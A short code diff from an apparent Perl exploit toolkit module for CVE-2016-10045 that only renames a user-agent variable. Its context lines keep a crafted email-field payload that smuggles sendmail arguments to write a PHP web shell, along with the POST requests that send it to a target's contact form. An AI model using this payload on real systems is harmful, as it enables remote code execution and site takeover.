@@ -29,7 +29,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
                 $target = "https://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $user_agent = Spellbook::Core::UserAgent -> new();
 
             if ($shell{'name'} ne 'spellbook_xpl.php') {
                 my $code = Mojo::File -> new($shell{name});
@@ -41,7 +41,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
             my $CVE_2016_10045 = "\"attacker\\' -oQ/tmp/ -X$dir/$shell{name}  some\"\@email.com";
 
             try {
-                my $request = $userAgent -> post($target, [
+                my $request = $user_agent -> post($target, [
                     'action'  => "send",
                     'name'    => "Jas Fasola",
                     'subject' => "Lorem ipsum",
@@ -51,7 +51,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
             }
 
             catch {
-                my $request = $userAgent -> post($target, [
+                my $request = $user_agent -> post($target, [
                     'action'  => "send",
                     'name'    => "Jas Fasola",
                     'subject' => "Lorem ipsum",
